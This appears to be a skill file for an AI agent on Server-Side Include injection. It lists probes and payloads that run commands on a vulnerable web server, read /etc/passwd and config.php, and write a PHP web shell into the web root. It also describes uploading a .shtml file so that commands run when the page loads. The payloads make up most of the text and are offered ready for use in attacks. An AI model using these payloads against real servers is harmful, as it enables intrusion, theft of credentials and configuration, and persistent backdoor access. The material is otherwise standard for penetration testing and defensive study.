---
name: ssi-injection
description: >-
  SSI injection. Use when a server parses attacker-controlled Server-Side Include directives.
---

# SSI Injection (Server-Side Includes)


### Mechanism

SSI directives are parsed by the web server (Apache, Nginx, IIS) before sending the response. If user input is embedded in `.shtml` or SSI-enabled pages without sanitization:

```
<!--#exec cmd="id"-->
<!--#include virtual="/etc/passwd"-->
```

### Detection

```text
# Probe: inject SSI directive in form field, URL param, or header:
<!--#echo var="DATE_LOCAL"-->

# If response contains the current date → SSI is active and input is parsed

# Confirm command execution:
<!--#exec cmd="id"-->
```

### Prerequisites

- Apache with `mod_include` and `Options +Includes`
- File extension `.shtml` or `AddOutputFilter INCLUDES .html`
- Nginx with `ssi on;` in location block
- IIS with SSI feature installed

### Key Payloads

```text
# Command execution:
<!--#exec cmd="id"-->
<!--#exec cmd="cat /etc/passwd"-->
<!--#exec cmd="ls -la"-->

# File include:
<!--#include virtual="/etc/passwd"-->
<!--#include file="config.php"-->

# Variable echo (safe probe):
<!--#echo var="DOCUMENT_ROOT"-->
<!--#echo var="SERVER_SOFTWARE"-->
<!--#echo var="REMOTE_ADDR"-->

# Chained with file write:
<!--#exec cmd="echo '<?php system($_GET[c]);?>' > /var/www/html/shell.php"-->
```

### Nginx SSI Configuration

```nginx
location / {
    ssi on;
    ssi_types text/shtml;
}
```

### Real-World Case: SSI via File Upload

Upload a file named `shell.shtml` with SSI directives:
```text
<!--#exec cmd="whoami"-->
```

If the web server processes `.shtml` files → command executes on page load.

### Where to Test

- Guest books, comment systems, forums
- Error pages that include user input
- Any `.shtml` endpoint accepting user data
- File upload → upload `.shtml` file with SSI directives

---
